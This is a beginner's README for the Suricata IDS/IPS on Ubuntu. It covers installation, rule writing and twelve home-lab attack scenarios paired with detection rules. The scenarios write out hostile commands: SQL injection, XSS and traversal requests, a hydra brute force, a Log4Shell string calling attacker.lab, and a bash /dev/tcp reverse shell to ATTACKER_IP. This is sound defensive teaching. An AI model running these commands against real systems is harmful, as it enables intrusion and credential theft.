<div align="center">

# 🛡️ Suricata on Ubuntu: Install, Use, and Write Rules

**A beginner-friendly, copy-paste guide to the Suricata IDS/IPS engine.**
Installation → configuration → commands → writing your own rules → attack scenarios you can test in a home lab.

![Suricata](https://img.shields.io/badge/Tool-Suricata_IDS%2FIPS-orange)
![Ubuntu](https://img.shields.io/badge/OS-Ubuntu_Server-E95420?logo=ubuntu&logoColor=white)
![Linux](https://img.shields.io/badge/OS-Linux-0E61AD?logo=Linux&logoColor=Green)
![Level](https://img.shields.io/badge/Level-Beginner_to_Intermediate-blue)
![Purpose](https://img.shields.io/badge/Use-Education_%26_Home_Lab-green)

Part of the **SEC W TOM** security tool installation series.
📺 YouTube: [@TOmSec-OG](https://www.youtube.com/@TOmSec-OG) · 💻 GitHub: [THeOLdMAn48](https://github.com/THeOLdMAn48/)

*Learn - Secure - Grow*

</div>

> ⚠️ **Legal and ethical notice.** Run attack commands in this guide **only against machines you own or have written permission to test** (your own VMs). Unauthorized scanning or attacking is illegal. This guide is for education and defensive learning.

---

## 📑 Table of Contents

1. [What is Suricata?](#1-what-is-suricata)
2. [IDS vs IPS](#2-ids-vs-ips)
3. [Requirements](#3-requirements)
4. [Lab setup used in this guide](#4-lab-setup-used-in-this-guide)
5. [Installation on Ubuntu](#5-installation-on-ubuntu)
6. [Important files and folders](#6-important-files-and-folders)
7. [Initial configuration](#7-initial-configuration)
8. [Update rules with `suricata-update`](#8-update-rules-with-suricata-update)
9. [Run Suricata and test it](#9-run-suricata-and-test-it)
10. [Everyday commands](#10-everyday-commands)
11. [Reading logs and alerts](#11-reading-logs-and-alerts)
12. [Understanding rules](#12-understanding-rules)
13. [Writing your own rules](#13-writing-your-own-rules)
14. [Attack scenarios and detection rules](#14-attack-scenarios-and-detection-rules)
15. [Running Suricata as an IPS (blocking)](#15-running-suricata-as-an-ips-blocking)
16. [Tuning: reduce false positives](#16-tuning-reduce-false-positives)
17. [Performance basics](#17-performance-basics)
18. [Sending logs to a SIEM](#18-sending-logs-to-a-siem)
19. [Troubleshooting](#19-troubleshooting)
20. [Command cheat sheet](#20-command-cheat-sheet)
21. [Repository layout and contributing](#21-repository-layout-and-contributing)
22. [References](#22-references)

---

## 1. What is Suricata?

**Suricata** is a free, open-source network threat detection engine developed by the [OISF](https://oisf.net/). It reads network traffic, compares it with **rules (signatures)**, and can:

- **Alert** when something looks malicious (IDS)
- **Block** malicious traffic (IPS)
- **Log** rich network metadata such as DNS, HTTP, TLS, and file info (NSM, Network Security Monitoring)

```
Network Traffic  →  Suricata Engine  →  Detection (rules)  →  Alert / Log / Drop
```

**Why SOC analysts use it:** real-time detection, huge free rulesets, protocol awareness (HTTP, DNS, TLS, SMB and more), structured **EVE JSON** logs that feed SIEM tools, and multi-threading for performance.

---

## 2. IDS vs IPS

| | **IDS** (Detection) | **IPS** (Prevention) |
|---|---|---|
| Full name | Intrusion Detection System | Intrusion Prevention System |
| Position | Out of band. Watches a *copy* of traffic (SPAN/mirror/TAP) | **Inline**. Traffic passes *through* it |
| Action | Alerts and logs | Alerts **and drops/rejects** |
| Risk | Cannot break traffic | A bad rule can block legitimate traffic |
| Best for | Learning, monitoring, SOC visibility | Blocking known-bad traffic after tuning |

> 💡 **Beginner path:** start in **IDS mode**, tune the rules, and only then try IPS mode ([Section 15](#15-running-suricata-as-an-ips-blocking)).

---

## 3. Requirements

### ✅ Mandatory

| Requirement | Why |
|---|---|
| A Linux system (this guide uses **Ubuntu**) | Suricata runs on Linux |
| `sudo` / root access | Installing packages, reading packet data |
| Internet access | `apt` and rule downloads |
| At least one network interface | Something to sniff |

### 👍 Recommended (lab suggestions, not official minimums)

| Item | Suggestion |
|---|---|
| OS | Ubuntu Server LTS (22.04 or 24.04) |
| CPU | 2+ cores |
| RAM | 4 GB+ |
| Disk | 20 GB+ free (logs grow quickly) |
| Extras | A VM snapshot before you start, `jq` for reading JSON logs |

Real resource needs grow with traffic volume and the number of enabled rules.

### Two kinds of network interface

| Interface | Purpose | Typical IP |
|---|---|---|
| **Management** | You connect over SSH, run `apt`, etc. | Has an IP address |
| **Monitoring** | Suricata captures traffic here | Often no IP (in a real tap/SPAN setup) |

In a single-VM home lab, one interface can do both jobs. That is fine for learning.

---

## 4. Lab setup used in this guide

```
┌──────────────────┐        ┌────────────────────────────────────┐
│  Attacker VM     │ ─────► │  Ubuntu Server VM  (192.168.56.10) │
│  Kali Linux      │        │  • Suricata (watches eth0)         │
│  192.168.56.20   │        │  • Apache / DVWA web server        │
└──────────────────┘        │  • SSH, FTP (optional)             │
                            └────────────────────────────────────┘
          Host-only or NAT network (192.168.56.0/24)
```

Replace the example IPs with yours everywhere in this guide. Placing Suricata **on the same VM as the target** is the simplest way to see every attack packet.

---

## 5. Installation on Ubuntu

### Step 1: Find your network interface

```bash
ip -br a              # list interfaces and IPs
ip route | grep default   # which interface has the default route
```

Note the name (for example `eth0`, `ens33`, `enp0s3`). You need it in [Section 7](#7-initial-configuration).

### Step 2: Update the system

```bash
sudo apt update && sudo apt upgrade -y
```

### Step 3: Install Suricata

**Option A: Ubuntu's own repository (simplest, may be an older version)**

```bash
sudo apt install -y suricata jq
```

**Option B: Official OISF PPA (newer stable version, recommended)**

```bash
sudo apt install -y software-properties-common
sudo add-apt-repository -y ppa:oisf/suricata-stable
sudo apt update
sudo apt install -y suricata jq
```

### Step 4: Verify the installation

```bash
suricata -V                       # version
suricata --build-info | head -20  # features compiled in
systemctl status suricata         # service state
```

You should see a version number such as `This is Suricata version 7.x.x RELEASE`.

> The package installs `suricata-update` (rule manager) and `suricatasc` (control tool) too.

---

## 6. Important files and folders

| Path | What it is |
|---|---|
| `/etc/suricata/suricata.yaml` | **Main configuration file** |
| `/etc/suricata/classification.config` | Alert classtypes and priorities |
| `/etc/suricata/threshold.config` | Suppress or rate-limit alerts |
| `/var/lib/suricata/rules/suricata.rules` | Rules downloaded by `suricata-update` |
| `/var/lib/suricata/rules/local.rules` | **Your own rules** (you create it, see [Section 13](#13-writing-your-own-rules)) |
| `/var/log/suricata/suricata.log` | Engine start-up and error messages |
| `/var/log/suricata/fast.log` | One-line text alerts, easy to read |
| `/var/log/suricata/eve.json` | **Full JSON log** (alerts, DNS, HTTP, TLS, flows) |
| `/var/log/suricata/stats.log` | Performance counters |
| `/etc/suricata/disable.conf`, `enable.conf`, `modify.conf`, `drop.conf` | Rule tuning files used by `suricata-update` (you create them) |

---

## 7. Initial configuration

Back up the config first, then edit it:

```bash
sudo cp /etc/suricata/suricata.yaml /etc/suricata/suricata.yaml.bak
sudo nano /etc/suricata/suricata.yaml
```

### 7.1 Set `HOME_NET` (your protected network)

```yaml
vars:
  address-groups:
    HOME_NET: "[192.168.56.0/24]"
    EXTERNAL_NET: "!$HOME_NET"
```

### 7.2 Set the capture interface

Find the `af-packet:` section and set your interface name:

```yaml
af-packet:
  - interface: eth0
    cluster-id: 99
    cluster-type: cluster_flow
    defrag: yes
```

### 7.3 Turn on Community ID (helps correlate with other tools)

Under `outputs:` → `eve-log:` set:

```yaml
community-id: true
```

### 7.4 Load your own rules file

Find the `rule-files:` list and add `local.rules`:

```yaml
default-rule-path: /var/lib/suricata/rules

rule-files:
  - suricata.rules
  - local.rules
```

Create the empty file so Suricata does not complain:

```bash
sudo touch /var/lib/suricata/rules/local.rules
```

### 7.5 Test the configuration

```bash
sudo suricata -T -c /etc/suricata/suricata.yaml -v
```

Look for: `Configuration provided was successfully loaded. Exiting.`

---

## 8. Update rules with `suricata-update`

`suricata-update` downloads and merges rule sets. By default it fetches the free **Emerging Threats Open (ET Open)** rules.

```bash
sudo suricata-update                      # download and merge rules
sudo suricata-update list-sources         # see available rule sources
sudo suricata-update enable-source tgreen/hunting   # example: enable an extra free source
sudo suricata-update                      # run again after enabling sources
```

Merged rules are written to `/var/lib/suricata/rules/suricata.rules`.

Reload rules **without** restarting:

```bash
sudo suricatasc -c reload-rules
```

Or restart the service (always works):

```bash
sudo systemctl restart suricata
```

> 💡 Run `sudo suricata-update` regularly (daily is common) so you get fresh detections.

---

## 9. Run Suricata and test it

### 9.1 Start as a service

```bash
sudo systemctl enable --now suricata
sudo systemctl status suricata
sudo tail -f /var/log/suricata/suricata.log
```

Wait until you see a line like `engine started`. The first start can take a minute while rules load.

### 9.2 First detection test

This request triggers a well-known ET Open test rule (`GPL ATTACK_RESPONSE id check returned root`):

```bash
curl http://testmynids.org/uid/index.html
```

Check the alert:

```bash
sudo tail -n 5 /var/log/suricata/fast.log
```

Expected: an alert containing `GPL ATTACK_RESPONSE id check returned root`.

If nothing appears, jump to [Troubleshooting](#19-troubleshooting).

### 9.3 Other ways to run Suricata

```bash
# Live capture in the foreground (stop with Ctrl+C)
sudo suricata -c /etc/suricata/suricata.yaml -i eth0

# Analyze a saved packet capture (offline). Great for learning and testing rules
mkdir -p ~/suri-out
suricata -c /etc/suricata/suricata.yaml -r sample.pcap -k none -l ~/suri-out
cat ~/suri-out/fast.log
```

`-k none` ignores checksum errors (common in captures taken on the same machine). `-l` chooses the log folder.

---

## 10. Everyday commands

| Task | Command |
|---|---|
| Version | `suricata -V` |
| Test config | `sudo suricata -T -c /etc/suricata/suricata.yaml -v` |
| Start / stop / restart | `sudo systemctl start suricata` (or `stop` / `restart`) |
| Status | `systemctl status suricata` |
| Enable at boot | `sudo systemctl enable suricata` |
| Update rules | `sudo suricata-update` |
| Reload rules live | `sudo suricatasc -c reload-rules` |
| Engine uptime | `sudo suricatasc -c uptime` |
| Run on one pcap | `suricata -c /etc/suricata/suricata.yaml -r file.pcap -k none -l ./out` |
| Test with **only** one rule file | `suricata -c /etc/suricata/suricata.yaml -S my.rules -r file.pcap -k none -l ./out` |
| Add an extra rule file | `suricata -c /etc/suricata/suricata.yaml -s my.rules -i eth0` |
| List enabled rule sources | `sudo suricata-update list-enabled-sources` |
| Live engine log | `sudo tail -f /var/log/suricata/suricata.log` |

---

## 11. Reading logs and alerts

### fast.log (quick look)

```bash
sudo tail -f /var/log/suricata/fast.log
```

Format: `date [**] [gid:sid:rev] message [**] [Classification] [Priority] {proto} src:port -> dst:port`

### eve.json with `jq` (the powerful one)

```bash
# Pretty alerts
sudo jq -c 'select(.event_type=="alert") | {time:.timestamp, sig:.alert.signature, src:.src_ip, dst:.dest_ip, sev:.alert.severity}' /var/log/suricata/eve.json

# Top 10 triggered signatures
sudo jq -r 'select(.event_type=="alert") | .alert.signature' /var/log/suricata/eve.json | sort | uniq -c | sort -nr | head

# Top 10 attacker (source) IPs
sudo jq -r 'select(.event_type=="alert") | .src_ip' /var/log/suricata/eve.json | sort | uniq -c | sort -nr | head

# DNS queries seen
sudo jq -r 'select(.event_type=="dns" and .dns.type=="query") | .dns.rrname' /var/log/suricata/eve.json | sort | uniq -c | sort -nr | head

# HTTP requests
sudo jq -r 'select(.event_type=="http") | "\(.http.hostname)\(.http.url)"' /var/log/suricata/eve.json | head

# TLS server names (SNI)
sudo jq -r 'select(.event_type=="tls") | .tls.sni' /var/log/suricata/eve.json | sort | uniq -c | sort -nr | head
```

### Check for dropped packets (performance health)

```bash
sudo grep -E "kernel_packets|kernel_drops" /var/log/suricata/stats.log | tail -4
```

Lots of `kernel_drops` means Suricata cannot keep up (see [Performance basics](#17-performance-basics)).

---

## 12. Understanding rules

A rule has a **header** (who talks to whom) and **options** (what to look for).

```
alert http any any -> $HOME_NET any (msg:"Example"; flow:established,to_server; http.uri; content:"admin"; nocase; sid:9100001; rev:1;)
└─┬─┘ └─┬┘ └┬┘ └┬┘ └┘ └────┬────┘ └┬┘ └───────────────────────────── options ──────────────────────────────────┘
action proto src  port dir  dst      port
```

### Header

| Part | Examples |
|---|---|
| **Action** | `alert` (log), `drop` (block, IPS only), `reject` (block + reset), `pass` (ignore traffic) |
| **Protocol** | `tcp`, `udp`, `icmp`, `ip`, `http`, `dns`, `tls`, `ftp`, `smb`, `ssh` and more |
| **Source / Dest** | `any`, `$HOME_NET`, `$EXTERNAL_NET`, `192.168.1.10`, `[10.0.0.0/8,172.16.0.0/12]`, `!192.168.1.5` |
| **Ports** | `any`, `80`, `[80,443]`, `1024:` (1024 and above), `!22` |
| **Direction** | `->` (one way), `<>` (both ways) |

### Common options

| Keyword | Meaning |
|---|---|
| `msg:"..."` | Text shown in the alert |
| `sid:N;` | Unique rule ID (**required**) |
| `rev:N;` | Rule version, increase it when you edit the rule |
| `classtype:name;` | Category (see `/etc/suricata/classification.config`) |
| `flow:established,to_server;` | Only match inside an established connection, client → server |
| `content:"text";` | Look for this string or bytes (`\|41 42\|` = hex bytes) |
| `nocase;` | Case-insensitive `content` |
| `depth:N;` / `offset:N;` | Search only within the first N bytes / start after N bytes |
| `distance:N;` / `within:N;` | Position relative to the *previous* match |
| `startswith;` / `endswith;` | Content must be at the start / end of the buffer |
| `pcre:"/regex/i";` | Regular expression match (use sparingly, it is slower) |
| `fast_pattern;` | Hint which `content` to use for quick pre-filtering |
| `flags:S;` | Match TCP flags (S=SYN, A=ACK, F=FIN, R=RST, P=PSH, U=URG) |
| `itype:8;` | ICMP type (8 = echo request / ping) |
| `threshold:...;` | Alert only after N hits in T seconds |
| `flowbits:set,name;` / `flowbits:isset,name;` | Chain events across packets in a flow |
| `metadata:...;` | Extra tags (author, date, attack_target) |

### Protocol "sticky buffers" (look inside application data)

Put the buffer name **before** the `content`/`pcre` that should search it:

| Buffer | Searches |
|---|---|
| `http.uri` | Normalized request URI |
| `http.uri.raw` | **Raw** URI (needed to catch `../`, since normalization removes it) |
| `http.method`, `http.host`, `http.user_agent` | Method, Host header, User-Agent |
| `http.header`, `http.cookie` | Headers, cookies |
| `http.request_body` | POST body |
| `dns.query` | The DNS name being queried |
| `tls.sni` | Server name in the TLS handshake |
| `file.data` | File contents seen in the stream |

### Choosing a `sid`

- Do **not** reuse IDs from public rulesets (ET Open mostly uses `2000000`–`2999999`).
- This guide uses **`9000001` and above** for lab rules. Pick your own range and keep it unique.

---

## 13. Writing your own rules

### Step 1: Create your local rules file

```bash
sudo nano /var/lib/suricata/rules/local.rules
```

(You already added `local.rules` to `rule-files:` in [Section 7.4](#74-load-your-own-rules-file).)

### Step 2: Write a simple rule

Detect any ping to your network:

```
alert icmp any any -> $HOME_NET any (msg:"LAB ICMP Echo Request (ping)"; itype:8; classtype:misc-activity; sid:9000001; rev:1;)
```

### Step 3: Validate before loading

```bash
sudo suricata -T -c /etc/suricata/suricata.yaml -v
```

Look for `1 rule files processed. N rules successfully loaded, 0 rules failed`. A syntax error names the exact line.

### Step 4: Load and test

```bash
sudo suricatasc -c reload-rules      # or: sudo systemctl restart suricata
ping -c 2 192.168.56.10              # run from the attacker VM
sudo tail -n 3 /var/log/suricata/fast.log
```

### Step 5: Rule-writing workflow (what pros do)

1. **Capture** the attack traffic to a `.pcap` (`sudo tcpdump -i eth0 -w attack.pcap`).
2. **Look** at the packets in Wireshark; find a unique, stable pattern.
3. **Write** the rule using the most specific buffer (`http.uri`, `dns.query`...).
4. **Replay** the pcap offline: `suricata -S my.rules -c /etc/suricata/suricata.yaml -r attack.pcap -k none -l ./out`
5. **Test against normal traffic** to find false positives.
6. **Version it**: bump `rev`, document it, commit it to Git.

### Rule-writing tips

- Match the **protocol** (`http`, `dns`) instead of raw `tcp` when possible. It is more accurate and faster.
- Add `flow:established,to_server;` to web rules so you only inspect client requests.
- Use `nocase` for case-insensitive attacks (`UNION`, `union`, `UnIoN`).
- Prefer `content` over `pcre`. Use `pcre` only when you must.
- Use `threshold` for noisy behaviors like scans and brute force.
- Special characters inside quotes (`;` `"` `\`) must be written as hex, for example `|3B|` for `;`.
- Always give each rule a unique `sid` and bump `rev` after edits.

---

## 14. Attack scenarios and detection rules

All rules below live in [`rules/local.rules`](rules/local.rules). Copy that file to `/var/lib/suricata/rules/local.rules`, then reload.

```bash
sudo cp rules/local.rules /var/lib/suricata/rules/local.rules
sudo suricata -T -c /etc/suricata/suricata.yaml -v
sudo suricatasc -c reload-rules
```

> Set `HOME_NET` to your lab network first (e.g. `192.168.56.0/24`). The attacker VM can be inside or outside `HOME_NET`. These rules use `any` as the source on purpose.
> In the commands below, `TARGET` = your Ubuntu VM IP (e.g. `192.168.56.10`).

### Scenario index

| # | Scenario | Rule SIDs |
|---|---|---|
| 1 | [Ping / ICMP recon](#scenario-1-ping--icmp-reconnaissance) | 9000001 |
| 2 | [Nmap port scans](#scenario-2-nmap-port-scans) | 9000002-9000004 |
| 3 | [SSH brute force](#scenario-3-ssh-brute-force) | 9000010 |
| 4 | [FTP cleartext credentials](#scenario-4-ftp-cleartext-credentials) | 9000011 |
| 5 | [SQL injection](#scenario-5-sql-injection) | 9000020, 9000021 |
| 6 | [Cross-site scripting (XSS)](#scenario-6-cross-site-scripting-xss) | 9000022 |
| 7 | [Directory traversal / LFI](#scenario-7-directory-traversal--local-file-inclusion) | 9000023, 9000025 |
| 8 | [Web scanner tools](#scenario-8-web-vulnerability-scanners) | 9000024 |
| 9 | [Log4Shell exploit attempt](#scenario-9-log4shell-jndi-exploit-attempt) | 9000026 |
| 10 | [Reverse shell](#scenario-10-reverse-shell-post-exploitation) | 9000030, 9000031 |
| 11 | [Malicious DNS and DNS tunneling](#scenario-11-malicious-dns-and-dns-tunneling) | 9000040, 9000041 |
| 12 | [Suspicious TLS destination](#scenario-12-suspicious-tls-destination-sni) | 9000042 |

---

### Scenario 1: Ping / ICMP reconnaissance

**Attack (from attacker VM):**
```bash
ping -c 3 TARGET
```

**Rule:**
```
alert icmp any any -> $HOME_NET any (msg:"LAB ICMP Echo Request (ping)"; itype:8; classtype:misc-activity; sid:9000001; rev:1;)
```

**How it works:** `itype:8` is an ICMP echo request.
**False positives:** monitoring tools and admins pinging. Fine for a lab, noisy in production.

---

### Scenario 2: Nmap port scans

**Attack:**
```bash
nmap -sS -p 1-1000 TARGET     # SYN (stealth) scan
nmap -sN -p 1-100 TARGET      # NULL scan (no flags)
nmap -sX -p 1-100 TARGET      # XMAS scan (FIN+PSH+URG)
```

**Rules:**
```
alert tcp any any -> $HOME_NET any (msg:"LAB Possible TCP SYN scan (many SYNs from one host)"; flags:S; threshold:type both, track by_src, count 20, seconds 10; classtype:attempted-recon; sid:9000002; rev:1;)

alert tcp any any -> $HOME_NET any (msg:"LAB Nmap NULL scan (no flags)"; flags:0; classtype:attempted-recon; sid:9000003; rev:1;)

alert tcp any any -> $HOME_NET any (msg:"LAB Nmap XMAS scan (FIN+PSH+URG)"; flags:FPU,12; classtype:attempted-recon; sid:9000004; rev:1;)
```

**How it works:** one host sending 20+ SYN packets in 10 seconds is a scan pattern (`threshold`). NULL and XMAS scans send unusual flag combinations that normal software never uses. `,12` ignores the two reserved bits.
**Tune:** raise `count` if vulnerability scanners run legitimately in your network.

---

### Scenario 3: SSH brute force

**Attack (use your own test account and a small wordlist):**
```bash
hydra -l testuser -P small-wordlist.txt ssh://TARGET -t 4
```

**Rule:**
```
alert tcp any any -> $HOME_NET 22 (msg:"LAB SSH brute force (many new connections)"; flow:to_server; flags:S; threshold:type both, track by_src, count 5, seconds 60; classtype:attempted-admin; sid:9000010; rev:1;)
```

**How it works:** five new SSH connections from one source inside 60 seconds. Brute-force tools open many connections quickly.
**False positives:** automation (Ansible, backup jobs) that logs in often. Lower or raise `count` to suit.
**Also do:** use SSH keys, disable password login, install `fail2ban`.

---

### Scenario 4: FTP cleartext credentials

**Setup:** `sudo apt install -y vsftpd` on the target (lab only).
**Attack / trigger:**
```bash
ftp TARGET        # log in with a test user; password travels in cleartext
```

**Rule:**
```
alert tcp any any -> $HOME_NET 21 (msg:"LAB FTP cleartext password seen"; flow:established,to_server; content:"PASS "; depth:5; classtype:policy-violation; sid:9000011; rev:1;)
```

**Lesson:** FTP sends passwords unencrypted. Use SFTP/FTPS instead. This is a *policy* detection, not an attack signature.

---

### Scenario 5: SQL injection

**Setup:** DVWA (Damn Vulnerable Web App) or any intentionally vulnerable app on the target.
**Attack:**
```bash
curl "http://TARGET/vulnerable.php?id=1%20UNION%20SELECT%20user,password%20FROM%20users"
curl "http://TARGET/vulnerable.php?id=1'%20OR%20'1'='1"
# Automated tool (own lab only):
sqlmap -u "http://TARGET/vulnerable.php?id=1" --batch
```

**Rules:**
```
alert http any any -> $HOME_NET any (msg:"LAB SQL injection - UNION SELECT in URI"; flow:established,to_server; http.uri; content:"union"; nocase; content:"select"; nocase; distance:0; classtype:web-application-attack; sid:9000020; rev:1;)

alert http any any -> $HOME_NET any (msg:"LAB SQL injection - OR 1=1 in URI"; flow:established,to_server; http.uri; pcre:"/(\x27|%27)\s*or\s*(\x27|%27)?1(\x27|%27)?\s*=\s*(\x27|%27)?1/i"; classtype:web-application-attack; sid:9000021; rev:1;)
```

**How it works:** looks in the **URI buffer** for `union` followed by `select`, and for the classic `' OR 1=1` pattern (plain or URL-encoded, any case).
**Limits:** attackers can obfuscate (comments, encodings, POST bodies). For POST attacks, add a similar rule with `http.request_body`. A WAF is the real defense. Suricata gives you visibility.

---

### Scenario 6: Cross-site scripting (XSS)

**Attack:**
```bash
curl "http://TARGET/search.php?q=<script>alert(1)</script>"
```

**Rule:**
```
alert http any any -> $HOME_NET any (msg:"LAB XSS - script tag in URI"; flow:established,to_server; http.uri; content:"<script"; nocase; classtype:web-application-attack; sid:9000022; rev:1;)
```

**Note:** this catches the simple, literal form only. Encoded variants and event-handler payloads (`onerror=`) need additional rules.

---

### Scenario 7: Directory traversal / Local File Inclusion

**Attack:**
```bash
curl --path-as-is "http://TARGET/../../etc/passwd"
curl "http://TARGET/page.php?file=../../../../etc/passwd"
```

**Rules:**
```
alert http any any -> $HOME_NET any (msg:"LAB Directory traversal in URI"; flow:established,to_server; http.uri.raw; pcre:"/(\.\.|%2e%2e)(\/|%2f|\\|%5c)/i"; classtype:web-application-attack; sid:9000023; rev:1;)

alert http any any -> $HOME_NET any (msg:"LAB Access to /etc/passwd via URI"; flow:established,to_server; http.uri; content:"/etc/passwd"; nocase; classtype:web-application-attack; sid:9000025; rev:1;)
```

**Key lesson:** Suricata *normalizes* `http.uri` (it resolves `../`), so a rule searching `http.uri` for `../` **never fires**. Use **`http.uri.raw`** to see the original text. Always replay a test pcap to confirm a rule really fires.

---

### Scenario 8: Web vulnerability scanners

**Attack (own lab only):**
```bash
nikto -h http://TARGET
sqlmap -u "http://TARGET/vulnerable.php?id=1" --batch
```

**Rule:**
```
alert http any any -> $HOME_NET any (msg:"LAB Scanner tool user-agent (sqlmap/nikto)"; flow:established,to_server; http.user_agent; pcre:"/(sqlmap|nikto)/i"; classtype:web-application-attack; sid:9000024; rev:1;)
```

**Note:** attackers can change the User-Agent, so this catches only lazy scans. It still gives quick, valuable visibility.

---

### Scenario 9: Log4Shell (JNDI) exploit attempt

Log4Shell (CVE-2021-44228) abuses a `${jndi:ldap://...}` string, often placed in headers like `User-Agent`.

**Attack simulation (harmless, no vulnerable app needed):**
```bash
curl -A '${jndi:ldap://attacker.lab/a}' http://TARGET/
```

**Rule:**
```
alert http any any -> $HOME_NET any (msg:"LAB Log4Shell JNDI lookup in HTTP header"; flow:established,to_server; http.header; content:"${jndi:"; nocase; classtype:attempted-admin; sid:9000026; rev:1;)
```

**Note:** real attackers obfuscate this string (`${${lower:j}ndi:...}`). Production rulesets (ET Open) cover many variants, so keep them updated.

---

### Scenario 10: Reverse shell (post-exploitation)

A reverse shell makes the victim connect *out* to the attacker and give a command prompt.

**Lab simulation:**
```bash
# On attacker VM: listen
nc -lvnp 4444

# On the target VM (lab only): connect back
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Then on the attacker's shell type:
id
```

**Rules:**
```
alert tcp any any -> any any (msg:"LAB Possible shell session - id command output on the wire"; flow:established; content:"uid="; content:"gid="; distance:0; within:20; content:"groups="; distance:0; within:30; classtype:trojan-activity; sid:9000030; rev:1;)

alert http any any -> $HOME_NET any (msg:"LAB Reverse shell string /dev/tcp in URI"; flow:established,to_server; http.uri; pcre:"/dev(\/|%2f)tcp(\/|%2f)/i"; classtype:web-application-attack; sid:9000031; rev:1;)
```

**How it works:** the first rule spots the output of the `id` command crossing the network in clear text, which is a strong sign of an interactive shell. The second spots a `/dev/tcp/` reverse-shell payload sent through a web request (command injection).
**Limits:** encrypted shells (SSH tunnels, TLS reverse shells) will not show plain `uid=`. Combine with DNS/TLS/flow analysis.

---

### Scenario 11: Malicious DNS and DNS tunneling

**Attack simulation:**
```bash
dig evil-lab.test
dig aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.tunnel.test
```

**Rules:**
```
alert dns any any -> any any (msg:"LAB DNS query for lab-blocked domain"; dns.query; content:"evil-lab.test"; nocase; endswith; classtype:trojan-activity; sid:9000040; rev:1;)

alert dns any any -> any any (msg:"LAB Possible DNS tunneling - very long label"; dns.query; pcre:"/^[a-z0-9]{40,}\./i"; classtype:bad-unknown; sid:9000041; rev:1;)
```

**How it works:** the first matches a known-bad domain. The second flags a 40+ character first label, typical of data hidden inside DNS names. Replace `evil-lab.test` with real threat-intel domains (or load them via a rule source).

---

### Scenario 12: Suspicious TLS destination (SNI)

Even encrypted HTTPS reveals the destination name in the handshake (the SNI).

**Simulation:**
```bash
# On a lab host: start a throwaway TLS listener
openssl req -x509 -newkey rsa:2048 -nodes -keyout k.pem -out c.pem -subj "/CN=badsite.lab" -days 1
sudo openssl s_server -accept 443 -key k.pem -cert c.pem -www

# From the attacker VM:
curl -k --resolve badsite.lab:443:TARGET https://badsite.lab/
```

**Rule:**
```
alert tls any any -> any any (msg:"LAB TLS connection to lab-blocked SNI"; tls.sni; content:"badsite.lab"; nocase; endswith; classtype:trojan-activity; sid:9000042; rev:1;)
```

---

### Verify your detections

After running scenarios, summarize what fired:

```bash
sudo jq -r 'select(.event_type=="alert") | .alert.signature' /var/log/suricata/eve.json | sort | uniq -c | sort -nr
```

---

## 15. Running Suricata as an IPS (blocking)

> ⚠️ Only do this in a lab, after tuning in IDS mode. A mistake can cut off your own access. Take a VM snapshot first.

### Option A: NFQUEUE on one host (easiest to learn)

This example inspects only **web traffic (port 80)** so SSH is never touched. `--queue-bypass` lets packets pass if Suricata is not running.

```bash
# 1) Stop the normal IDS service
sudo systemctl stop suricata

# 2) Send port-80 traffic to Suricata
sudo iptables -I INPUT  -p tcp --dport 80 -j NFQUEUE --queue-num 0 --queue-bypass
sudo iptables -I OUTPUT -p tcp --sport 80 -j NFQUEUE --queue-num 0 --queue-bypass

# 3) Run Suricata in NFQ (inline) mode
sudo suricata -c /etc/suricata/suricata.yaml -q 0
```

Add a **drop** rule to `local.rules` (an `alert` becomes a `drop`):

```
drop http any any -> $HOME_NET any (msg:"LAB IPS DROP - SQLi UNION SELECT"; flow:established,to_server; http.uri; content:"union"; nocase; content:"select"; nocase; distance:0; classtype:web-application-attack; sid:9000050; rev:1;)
```

Test from the attacker VM: the SQLi request should **time out** (blocked) and `fast.log` / `eve.json` show the alert with action `blocked`.

**Undo everything when finished:**
```bash
sudo iptables -D INPUT  -p tcp --dport 80 -j NFQUEUE --queue-num 0 --queue-bypass
sudo iptables -D OUTPUT -p tcp --sport 80 -j NFQUEUE --queue-num 0 --queue-bypass
sudo systemctl start suricata
```

### Option B: Inline bridge between two interfaces

Used on a dedicated IPS box with two NICs. In `suricata.yaml`:

```yaml
af-packet:
  - interface: eth1
    copy-mode: ips
    copy-iface: eth2
  - interface: eth2
    copy-mode: ips
    copy-iface: eth1
```

Traffic entering `eth1` is inspected and forwarded to `eth2` (and the reverse). `drop` rules discard packets. Read the official [IPS setup docs](https://docs.suricata.io/en/latest/setting-up-ipsinline-for-linux.html) before using this beyond a lab.

### Convert rules to drop with `suricata-update`

Instead of editing rules by hand, list what to block in `/etc/suricata/drop.conf` (same format as `disable.conf`), then run `sudo suricata-update`.

---

## 16. Tuning: reduce false positives

A fresh install with ET Open can produce many alerts. Tune, do not ignore.

### Disable a noisy rule: `/etc/suricata/disable.conf`

```
# one signature ID per line
2100498
# or a whole group
group:emerging-icmp.rules
# or by regex on the rule text
re:heartbleed
```

Apply: `sudo suricata-update`

### Enable a normally-disabled rule: `/etc/suricata/enable.conf`

```
2024897
```

### Modify a rule: `/etc/suricata/modify.conf`

```
# change alert to drop for one SID
2100498 "^alert" "drop"
```

### Suppress alerts for a trusted host: `/etc/suricata/threshold.config`

```
suppress gen_id 1, sig_id 2100498, track by_src, ip 192.168.56.20
```

Make sure `threshold-file: /etc/suricata/threshold.config` is set in `suricata.yaml`, then reload.

### Limit alert floods

```
threshold gen_id 1, sig_id 9000001, type limit, track by_src, count 1, seconds 60
```

(Alert only once per minute per source for that rule.)

---

## 17. Performance basics

| Tip | How |
|---|---|
| Turn off NIC offloading on the capture interface | `sudo ethtool -K eth0 gro off lro off` (offloaded packets can confuse detection) |
| Watch for drops | `grep kernel_drops /var/log/suricata/stats.log \| tail` |
| Match threads to CPU | Tune `af-packet` `threads:` and `cluster-id` in `suricata.yaml` |
| Use fewer rules | Disable rule groups you do not need (`disable.conf`) |
| Rotate logs | Make sure `logrotate` handles `/var/log/suricata/*.log` and `eve.json` |
| Disk | `eve.json` grows fast, so monitor free space |

Make the `ethtool` setting permanent with a systemd service or netplan hook if you rely on it.

---

## 18. Sending logs to a SIEM

Suricata's `eve.json` is built for ingestion.

**Wazuh agent** (add to `/var/ossec/etc/ossec.conf`):
```xml
<localfile>
  <log_format>json</log_format>
  <location>/var/log/suricata/eve.json</location>
</localfile>
```

**Elastic Filebeat:**
```bash
sudo filebeat modules enable suricata
# then set var.paths: ["/var/log/suricata/eve.json"] in modules.d/suricata.yml
```

**Splunk / others:** monitor `/var/log/suricata/eve.json` as `_json` source type.

